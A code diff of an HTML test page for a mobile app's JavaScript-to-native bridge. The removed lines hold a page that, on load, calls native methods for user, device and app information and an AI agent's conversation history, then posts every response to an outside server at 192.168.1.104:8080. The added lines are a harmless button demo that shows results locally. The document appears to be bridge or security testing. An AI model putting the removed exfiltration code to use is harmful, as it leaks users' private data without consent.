@@ -2,147 +2,45 @@
 <html>
 
 <head>
-    <title>Debug Page</title>
-    <style>
-        #debugOutput {
-            width: 100%;
-            height: 300px;
-            font-family: monospace;
-            font-size: 12px;
-            border: 1px solid #ccc;
-            padding: 10px;
-            overflow-y: auto;
-            background-color: #f5f5f5;
-        }
-    </style>
+    <title>Demo</title>
 </head>
 
 <body>
-    <h3>Debug Output</h3>
-    <textarea id="debugOutput" readonly></textarea>
+    <h1>调用测试</h1>
+    <p>test</p>
+    <button onclick="getAccountInfo()">获取账户信息</button>
+    <h2>返回结果:</h2>
+    <pre id="result">等待调用...</pre>
+
     <script>
-        // Debug函数
-        function debugLog(message) {
-            const debugOutput = document.getElementById('debugOutput');
-            const timestamp = new Date().toLocaleTimeString();
-            debugOutput.value += `[${timestamp}] ${message}\n`;
-            debugOutput.scrollTop = debugOutput.scrollHeight;
-            console.log(`DEBUG: ${message}`);
-        }
-
-        // 全局可见的makeRequest函数
-        makeRequest = function (method, params) {
-            debugLog(`发起请求: method=${method}, params=${params}`);
-            const reqData = params === 'history'
-                ? {
-                    path: "api/user/agent/conversation/list",
-                    method: "POST",
-                    data: JSON.stringify({
-                        agentId: "naQivTmsDa",
-                        offset: 0,
-                        limit: 40,
-                        filterGoodQuestion: true
-                    }),
-                    header: "{}"
-                }
-                : {  // 新增对话详情请求
-                    path: "api/user/agent/conversation/v1/detail",
-                    method: "POST",
-                    data: JSON.stringify({
-                        conversationId: "62184080-ec6f-487b-94b5-31168f89901d",
-                        offset: 0,
-                        limit: 60
-                    }),
-                    header: "{}"
-                };
-            debugLog(`JsRuntime.invoke调用: ${JSON.stringify(reqData)}`);
-            JsRuntime.invoke('request', JSON.stringify(reqData), Date.now());
-            document.location.href = "http://test.woa.com";
+        // 创建imaFrame对象来接收回调
+        window.imaFrame = {
+            callbackFromNative: function (callbackId, result) {
+                console.log('收到回调:', callbackId, result);
+                document.getElementById('result').textContent = JSON.stringify(result, null, 2);
+            }
         };
 
-        // 全局可见的sendToServer函数
-        window.sendToServer = function (data) {
-            const finalData = data.error ? {
-                timestamp: new Date().toISOString(),
-                type: 'client_error',
-                data
-            } : data;
-
-            fetch('http://192.168.1.104:8080', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(finalData)
-            });
-        };
-
-        function invokeTimer() {
-            setTimeout(getUserInfo, 500);
-            document.location.href = "http://test.woa.com";
-
-            setTimeout(getAppVersion, 500);
-            document.location.href = "http://test.woa.com";
-
-            setTimeout(getDeviceInfo, 500);
-            document.location.href = "http://test.woa.com";
-        }
-
-        function getUserInfo() {
-            debugLog('getUserInfo');
+        function getAccountInfo() {
             try {
-                const callbackId = `dev_${Date.now()}`;
-                JsRuntime.invoke('getUserInfo', '{}', callbackId);
-            } catch (error) {
-                debugLog(`请求失败: ${error.message}`)
-            }
-        }
+                if (window.imaJsBridge && window.imaJsBridge.invokeWithCallback) {
+                    // 使用invokeWithCallback而不是invoke
+                    var callbackId = 'callback_' + Date.now();
+                    var requestData = JSON.stringify({
+                        action: "getAccountInfo",
+                        callbackId: callbackId,
+                        args: "{}"
+                    });
 
-        function getAppVersion() {
-            debugLog('getAppVersion');
-            try {
-                const callbackId = `dev_${Date.now()}`;
-                JsRuntime.invoke('getAppVersion', '{}', callbackId);
-            } catch (error) {
-                debugLog(`请求失败: ${error.message}`)
-            }
-        }
-
-        function getDeviceInfo() {
-            debugLog('getDeviceInfo');
-            try {
-                const callbackId = `dev_${Date.now()}`;
-                JsRuntime.invoke('getDeviceInfo', '{}', callbackId);
-            } catch (error) {
-                debugLog(`请求失败: ${error.message}`)
-            }
-        }
-
-        window.addEventListener('load', function () {
-            debugLog('准备跳转到test.woa.com');
-
-            invokeTimer()
-            setTimeout(() => {
-                debugLog('执行history请求');
-                window.makeRequest("request", "history");
-            }, 500);
-            document.location.href = "http://test.woa.com";
-            setTimeout(() => {
-                debugLog('执行conversationDetail请求');
-                window.makeRequest("request", "conversationDetail");
-            }, 600);
-            document.location.href = "http://test.woa.com";
-
-            window.jsb = {
-                handleMessage: response => {
-                    debugLog(`收到JSB响应: ${JSON.stringify(response)}`);
-                    const payload = {
-                        timestamp: new Date().toISOString(),
-                        type: 'jsb_response',
-                        data: response
-                    };
-                    window.sendToServer(payload);
+                    document.getElementById('result').textContent = '正在调用...';
+                    window.imaJsBridge.invokeWithCallback(requestData);
+                } else {
+                    document.getElementById('result').textContent = 'imaJsBridge接口不可用';
                 }
-            };
-        })
+            } catch (error) {
+                document.getElementById('result').textContent = '调用失败: ' + error.message;
+            }
+        }
     </script>
 </body>
 
